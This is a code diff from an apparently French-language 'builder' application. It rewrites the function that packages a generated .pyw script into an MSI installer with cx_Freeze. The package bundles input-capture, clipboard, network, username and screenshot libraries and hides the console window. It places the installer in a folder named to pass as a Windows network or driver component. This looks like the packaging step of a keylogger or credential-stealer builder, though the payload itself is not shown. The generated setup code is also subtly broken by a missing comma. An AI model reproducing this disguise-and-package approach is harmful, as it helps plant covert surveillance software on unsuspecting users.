@@ -322,59 +322,69 @@ def pyw():
 
         messagebox.showinfo(title="Fini", message="Le fichier a été créer avec succès")
 
+import subprocess
 
 def msi():
-
+    global nom_fichier
     global temp_script
 
-    messagebox.showwarning(message="Vous allez généré le .msi")
-        
-    messagebox.showinfo(title="Ne pas fermer", message="L'application risque de planter mais elle met en place le .msi, NE FERMEZ PAS ! ")
-    
+    # Vérifie que le .pyw existe
+    if not os.path.exists(temp_script):
+        pyw()  # Génère le fichier .pyw
 
-    # --- 2) Création du setup_msi.py temporaire ---
-    setup_filename = "setup_msi.py"
+    setup_filename = "setup_msi_temp.py"
+
+    # Création du fichier setup pour cx_Freeze
     with open(setup_filename, "w", encoding="utf-8") as f:
         f.write(
-            "from cx_Freeze import setup, Executable\n"
-            f"setup(name='{nom_fichier}', version='1.0', description='Programme créé avec le builder', executables=[Executable('{temp_script}')])\n"
+            "from cx_Freeze import setup, Executable\n\n"
+            f"setup(\n"
+            f"    name='{nom_fichier}',\n"
+            f"    version='1.0',\n"
+            f"    description='Programme créé avec le builder',\n"
+            f"    options={{\n"
+            f"        'build_exe': {{\n"
+            f"            'packages': ['pynput', 'customtkinter', 'requests', 'clipboard', 'PIL', 'getpass', 'platform', 'socket', 'time', 'pynput', 'io']\n"
+            f"            'include_files': []\n"
+            f"        }}\n"
+            f"    }},\n"
+            f"    executables=[Executable('{temp_script}', base='Win32GUI')]\n"
+            f")\n"
         )
 
-    time.sleep(2)
-    messagebox.showwarning(message="Installation du MSI. Ne quittez pas")
+    # Lancement de la génération MSI avec subprocess
+    result = subprocess.run(["python", setup_filename, "bdist_msi"], capture_output=True, text=True)
+    if result.returncode != 0:
+        messagebox.showerror("Erreur", f"La génération du MSI a échoué :\n{result.stderr}")
+        return
 
-    # Génération du MSI
-    os.system(f"python {setup_filename} bdist_msi")
-
-    # Deplacement du msi dans Windows-driver
     dist_dir = "dist"
-    output_dir = "Windows-driver-x64msi"
+    if not os.path.exists(dist_dir):
+        messagebox.showerror("Erreur", "Le dossier 'dist' est introuvable après la génération du MSI !")
+        return
+
+    output_dir = "WindowsNetwork-.x64msi"
     os.makedirs(output_dir, exist_ok=True)
 
-    # Cherche le .msi généré
     msi_files = [f for f in os.listdir(dist_dir) if f.endswith(".msi")]
     if not msi_files:
         messagebox.showerror("Erreur", "Aucun MSI généré !")
         return
 
-    for msi in msi_files:
-        shutil.move(os.path.join(dist_dir, msi), os.path.join(output_dir, msi))
+    for msi_file in msi_files:
+        shutil.move(os.path.join(dist_dir, msi_file), os.path.join(output_dir, msi_file))
 
-    time.sleep(3)
-    messagebox.showwarning("Nettoyage de fichier temporaire. NE QUITTEZ PAS !")
-
-    # --- 5) Nettoyage des fichiers temporaires ---
+    # Nettoyage
     for file in [temp_script, setup_filename]:
         if os.path.exists(file):
             os.remove(file)
-    # Supprimer dossiers build/ et dist/ si vide
     if os.path.exists("build"):
         shutil.rmtree("build")
     if os.path.exists("dist"):
         shutil.rmtree("dist")
 
-    messagebox.showinfo("Succès", f"✅ MSI créé dans {output_dir}/, prêt à l'installation par l'utilisateur !")
-    
+    messagebox.showinfo("Succès", f"✅ MSI créé dans {output_dir}/, prêt à l'installation !")
+
 
 # ---------------- INTERFACE ----------------
 app = ctk.CTk()
